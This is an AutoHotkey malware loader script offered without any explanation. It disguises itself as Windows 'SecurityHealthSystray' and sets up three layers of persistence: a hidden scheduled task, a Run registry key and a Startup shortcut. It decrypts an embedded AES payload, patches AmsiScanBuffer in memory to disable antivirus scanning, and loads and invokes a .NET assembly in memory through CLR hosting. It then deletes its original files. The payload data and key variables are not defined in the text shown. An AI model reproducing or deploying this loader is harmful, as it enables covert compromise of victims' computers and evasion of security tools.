#NoTrayIcon
#SingleInstance Ignore
SetBatchLines -1

; ---- Phase 0: Persistence Install ----
persistDir := A_AppData . "\Microsoft\Windows\Security\Health"
persistExe := persistDir . "\SecurityHealthSystray.exe"
persistScript := persistDir . "\HealthTelemetry.dat"
_firstRun := false

if (A_ScriptDir != persistDir) {
    _firstRun := true
    FileCreateDir, %persistDir%
    FileCopy, %A_ScriptDir%\%A_ScriptName%, %persistScript%, 1
    thisExe := A_ScriptDir . "\" . SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".") - 1) . ".exe"
    if (!FileExist(thisExe))
        thisExe := A_AhkPath
    FileCopy, %thisExe%, %persistExe%, 1

    ; Layer 1: Scheduled Task via COM
    try {
        scheduler := ComObjCreate("Schedule.Service")
        scheduler.Connect()
        taskDef := scheduler.NewTask(0)
        taskDef.Settings.Hidden := true
        taskDef.Settings.DisallowStartIfOnBatteries := false
        taskDef.Settings.StopIfGoingOnBatteries := false
        taskDef.Settings.ExecutionTimeLimit := "PT0S"
        trigger := taskDef.Triggers.Create(9)
        trigger.Enabled := true
        action := taskDef.Actions.Create(0)
        action.Path := persistExe
        action.Arguments := """" . persistScript . """"
        action.WorkingDirectory := persistDir
        folder := scheduler.GetFolder("\")
        folder.RegisterTaskDefinition("SecurityHealthSystray", taskDef, 6, "", "", 3)
    }

    ; Layer 2: HKCU Run key
    runVal := """" . persistExe . """ """ . persistScript . """"
    RegWrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, SecurityHealthSystray, %runVal%

    ; Layer 3: Startup folder shortcut
    startupLnk := A_Startup . "\SecurityHealth.lnk"
    FileCreateShortcut, %persistExe%, %startupLnk%, %persistDir%, "%persistScript%", , %persistExe%
}

hexPayload := _p1 . _p2 . _p3 . _p4 . _p5 . _p6 . _p7 . _p8 . _p9 . _p10 . _p11 . _p12 . _p13 . _p14 . _p15 . _p16 . _p17 . _p18 . _p19 . _p20 . _p21 . _p22 . _p23 . _p24 . _p25 . _p26 . _p27 . _p28 . _p29 . _p30 . _p31 . _p32 . _p33 . _p34 . _p35 . _p36 . _p37 . _p38 . _p39 . _p40 . _p41 . _p42 . _p43 . _p44 . _p45 . _p46 . _p47 . _p48 . _p49 . _p50 . _p51 . _p52 . _p53 . _p54 . _p55 . _p56 . _p57 . _p58 . _p59 . _p60 . _p61 . _p62 . _p63 . _p64 . _p65 . _p66

; ---- Phase 1: Hex decode via CryptStringToBinary ----
payloadLen := StrLen(hexPayload) // 2
VarSetCapacity(encBytes, payloadLen, 0)
cbBin := payloadLen
DllCall("Crypt32\CryptStringToBinaryW", "WStr", hexPayload, "UInt", 0, "UInt", 12, "Ptr", &encBytes, "UInt*", cbBin, "Ptr", 0, "Ptr", 0, "Int")
payloadLen := cbBin

VarSetCapacity(aesKey, 32, 0)
cbK := 32
DllCall("Crypt32\CryptStringToBinaryW", "WStr", hexKey, "UInt", 0, "UInt", 12, "Ptr", &aesKey, "UInt*", cbK, "Ptr", 0, "Ptr", 0, "Int")

VarSetCapacity(aesIV, 16, 0)
cbI := 16
DllCall("Crypt32\CryptStringToBinaryW", "WStr", hexIV, "UInt", 0, "UInt", 12, "Ptr", &aesIV, "UInt*", cbI, "Ptr", 0, "Ptr", 0, "Int")

; ---- Phase 2: AES-256-CBC Decrypt via bcrypt.dll ----
hAlg := 0
DllCall("bcrypt\BCryptOpenAlgorithmProvider", "Ptr*", hAlg, "WStr", "AES", "Ptr", 0, "UInt", 0, "UInt")

VarSetCapacity(cmW, 34, 0)
cm := "ChainingModeCBC"
Loop, % StrLen(cm)
    NumPut(Asc(SubStr(cm, A_Index, 1)), cmW, (A_Index - 1) * 2, "UShort")
DllCall("bcrypt\BCryptSetProperty", "Ptr", hAlg, "WStr", "ChainingMode", "Ptr", &cmW, "UInt", 34, "UInt", 0, "UInt")

hKey := 0
DllCall("bcrypt\BCryptGenerateSymmetricKey", "Ptr", hAlg, "Ptr*", hKey, "Ptr", 0, "UInt", 0, "Ptr", &aesKey, "UInt", 32, "UInt", 0, "UInt")

VarSetCapacity(decBytes, payloadLen, 0)
VarSetCapacity(cbResult, 4, 0)
DllCall("bcrypt\BCryptDecrypt"
    , "Ptr", hKey
    , "Ptr", &encBytes
    , "UInt", payloadLen
    , "Ptr", 0
    , "Ptr", &aesIV
    , "UInt", 16
    , "Ptr", &decBytes
    , "UInt", payloadLen
    , "Ptr", &cbResult
    , "UInt", 1
    , "UInt")
peSize := NumGet(cbResult, 0, "UInt")

DllCall("bcrypt\BCryptDestroyKey", "Ptr", hKey, "UInt")
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlg, "UInt", 0, "UInt")

; ---- Phase 3: AMSI Patch ----
hAmsi := DllCall("kernel32\LoadLibraryW", "WStr", "amsi.dll", "Ptr")
if (hAmsi) {
    pTarget := DllCall("kernel32\GetProcAddress", "Ptr", hAmsi, "AStr", "AmsiScanBuffer", "Ptr")
    if (pTarget) {
        VarSetCapacity(oldP, 4, 0)
        DllCall("kernel32\VirtualProtect", "Ptr", pTarget, "UInt", 8, "UInt", 0x40, "Ptr", &oldP, "Int")
        NumPut(0xB8, pTarget + 0, 0, "UChar")
        NumPut(0x57, pTarget + 1, 0, "UChar")
        NumPut(0x00, pTarget + 2, 0, "UChar")
        NumPut(0x07, pTarget + 3, 0, "UChar")
        NumPut(0x80, pTarget + 4, 0, "UChar")
        NumPut(0xC2, pTarget + 5, 0, "UChar")
        NumPut(0x18, pTarget + 6, 0, "UChar")
        NumPut(0x00, pTarget + 7, 0, "UChar")
        DllCall("kernel32\VirtualProtect", "Ptr", pTarget, "UInt", 8, "UInt", NumGet(oldP, 0, "UInt"), "Ptr", &oldP, "Int")
    }
}

; ---- Phase 4: CLR Hosting via CorBindToRuntimeEx ----
GUID(ByRef buf, d1, d2, d3, b1, b2, b3, b4, b5, b6, b7, b8) {
    VarSetCapacity(buf, 16)
    NumPut(d1, buf, 0, "UInt"), NumPut(d2, buf, 4, "UShort"), NumPut(d3, buf, 6, "UShort")
    NumPut(b1, buf, 8, "UChar"), NumPut(b2, buf, 9, "UChar")
    NumPut(b3, buf, 10, "UChar"), NumPut(b4, buf, 11, "UChar")
    NumPut(b5, buf, 12, "UChar"), NumPut(b6, buf, 13, "UChar")
    NumPut(b7, buf, 14, "UChar"), NumPut(b8, buf, 15, "UChar")
}

VT(ptr, idx) {
    return NumGet(NumGet(ptr + 0, 0, "UInt") + idx * 4, 0, "UInt")
}

DllCall("ole32\CoInitializeEx", "Ptr", 0, "UInt", 0, "Int")

GUID(CLSID_CorHost, 0xCB2F6723, 0xAB3A, 0x11D2, 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E)
GUID(IID_ICorHost, 0xCB2F6722, 0xAB3A, 0x11D2, 0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E)
GUID(IID_AD, 0x05F696DC, 0x2B29, 0x3663, 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13)

pHost := 0
DllCall("mscoree\CorBindToRuntimeEx", "WStr", "v4.0.30319", "WStr", "wks", "UInt", 0, "Ptr", &CLSID_CorHost, "Ptr", &IID_ICorHost, "Ptr*", pHost, "Int")
if (!pHost)
    ExitApp

DllCall(VT(pHost, 10), "UInt", pHost, "Int")

pDT := 0
DllCall(VT(pHost, 13), "UInt", pHost, "UInt*", pDT, "Int")
if (!pDT)
    ExitApp

pAD := 0
DllCall(VT(pDT, 0), "UInt", pDT, "Ptr", &IID_AD, "UInt*", pAD, "Int")
if (!pAD)
    ExitApp

; ---- Phase 5: SAFEARRAY + Load_3 ----
VarSetCapacity(bound, 8, 0)
NumPut(peSize, bound, 0, "UInt")
NumPut(0, bound, 4, "UInt")
pSA := DllCall("oleaut32\SafeArrayCreate", "UShort", 0x11, "UInt", 1, "Ptr", &bound, "Ptr")
if (!pSA)
    ExitApp

pData := 0
DllCall("oleaut32\SafeArrayAccessData", "Ptr", pSA, "Ptr*", pData, "Int")
DllCall("ntdll\RtlMoveMemory", "Ptr", pData, "Ptr", &decBytes, "UInt", peSize)
DllCall("oleaut32\SafeArrayUnaccessData", "Ptr", pSA, "Int")

pAsm := 0
hr := DllCall(VT(pAD, 45), "UInt", pAD, "Ptr", pSA, "UInt*", pAsm, "Int")
DllCall("oleaut32\SafeArrayDestroy", "Ptr", pSA, "Int")
if (hr != 0 || !pAsm)
    ExitApp

; ---- Phase 6: get_EntryPoint + Invoke_3 ----
pMI := 0
DllCall(VT(pAsm, 16), "UInt", pAsm, "UInt*", pMI, "Int")
if (!pMI)
    ExitApp

; ---- Phase 7: Conditional cleanup ----
if (_firstRun) {
    origAhk := A_ScriptFullPath
    origExe := A_ScriptDir . "\" . SubStr(A_ScriptName, 1, InStr(A_ScriptName, ".") - 1) . ".exe"
    FileDelete, %origAhk%
    FileDelete, %origExe%
}

VarSetCapacity(retV, 16, 0)
DllCall(VT(pMI, 37), "UInt", pMI, "UInt", 0, "UInt", 0, "UInt", 0, "UInt", 0, "Ptr", 0, "Ptr", &retV, "Int")
ExitApp
